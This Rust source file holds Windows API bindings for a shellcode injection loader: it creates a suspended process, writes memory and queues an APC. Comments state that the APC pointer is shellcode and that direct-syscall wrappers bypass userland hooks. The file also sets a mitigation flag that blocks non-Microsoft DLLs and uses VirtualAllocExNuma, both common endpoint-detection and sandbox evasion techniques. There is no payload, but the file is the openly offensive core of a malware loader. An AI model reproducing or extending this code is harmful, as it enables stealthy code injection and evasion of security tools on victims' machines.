use std::ffi::c_void;

pub const MEM_COMMIT: u32 = 0x00001000;
pub const MEM_RESERVE: u32 = 0x00002000;
pub const PAGE_READWRITE: u32 = 0x04;
pub const PAGE_EXECUTE_READ: u32 = 0x20;
pub const HEAP_ZERO_MEMORY: u32 = 0x00000008;
pub const CREATE_SUSPENDED: u32 = 0x00000004;
pub const CREATE_NO_WINDOW: u32 = 0x08000000;
pub const EXTENDED_STARTUPINFO_PRESENT: u32 = 0x00080000;
pub const PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY: usize = 0x20007;
pub const MITIGATION_BLOCK_NON_MICROSOFT: u64 = 1u64 << 44;

#[repr(C)]
pub struct STARTUPINFOA {
    pub cb: u32,
    lp_reserved: *mut u8,
    lp_desktop: *mut u8,
    lp_title: *mut u8,
    dw_x: u32,
    dw_y: u32,
    dw_x_size: u32,
    dw_y_size: u32,
    dw_x_count_chars: u32,
    dw_y_count_chars: u32,
    dw_fill_attribute: u32,
    dw_flags: u32,
    w_show_window: u16,
    cb_reserved2: u16,
    lp_reserved2: *mut u8,
    h_std_input: *mut c_void,
    h_std_output: *mut c_void,
    h_std_error: *mut c_void,
}

#[repr(C)]
pub struct STARTUPINFOEXA {
    pub startup_info: STARTUPINFOA,
    pub lp_attribute_list: *mut c_void,
}

#[repr(C)]
pub struct PROCESS_INFORMATION {
    pub h_process: *mut c_void,
    pub h_thread: *mut c_void,
    pub dw_process_id: u32,
    pub dw_thread_id: u32,
}

#[link(name = "kernel32")]
unsafe extern "system" {
    pub fn GetProcessHeap() -> *mut c_void;
    pub fn HeapAlloc(h_heap: *mut c_void, dw_flags: u32, dw_bytes: usize) -> *mut c_void;
    pub fn HeapFree(h_heap: *mut c_void, dw_flags: u32, lp_mem: *mut c_void) -> i32;

    pub fn InitializeProcThreadAttributeList(
        lp_attribute_list: *mut c_void,
        dw_attribute_count: u32,
        dw_flags: u32,
        lp_size: *mut usize,
    ) -> i32;

    pub fn UpdateProcThreadAttribute(
        lp_attribute_list: *mut c_void,
        dw_flags: u32,
        attribute: usize,
        lp_value: *mut c_void,
        cb_size: usize,
        lp_previous_value: *mut c_void,
        lp_return_size: *mut usize,
    ) -> i32;

    pub fn CreateProcessA(
        lp_application_name: *const u8,
        lp_command_line: *mut u8,
        lp_process_attributes: *mut c_void,
        lp_thread_attributes: *mut c_void,
        b_inherit_handles: i32,
        dw_creation_flags: u32,
        lp_environment: *mut c_void,
        lp_current_directory: *const u8,
        lp_startup_info: *mut STARTUPINFOA,
        lp_process_information: *mut PROCESS_INFORMATION,
    ) -> i32;

    pub fn VirtualAllocExNuma(
        h_process: *mut c_void,
        lp_address: *mut c_void,
        dw_size: usize,
        fl_allocation_type: u32,
        fl_protect: u32,
        nnd_preferred: u32,
    ) -> *mut c_void;

    // pfn_apc is a shellcode address cast to a function pointer at the call site
    pub fn QueueUserAPC(pfn_apc: *mut c_void, h_thread: *mut c_void, dw_data: usize) -> u32;

    pub fn ResumeThread(h_thread: *mut c_void) -> u32;
}

unsafe extern "C" {
    // Resolves SSN dynamically from NTDLL export table and issues syscall directly,
    // bypassing any userland hooks on NtWriteVirtualMemory.
    pub fn Sw3NtWriteVirtualMemory(
        process_handle: *mut c_void,
        base_address: *mut c_void,
        buffer: *const c_void,
        number_of_bytes: usize,
        number_of_bytes_written: *mut usize,
    ) -> i32;

    // Same direct-syscall bypass for NtProtectVirtualMemory.
    pub fn Sw3NtProtectVirtualMemory(
        process_handle: *mut c_void,
        base_address: *mut *mut c_void,
        region_size: *mut usize,
        new_protect: u32,
        old_protect: *mut u32,
    ) -> i32;
}
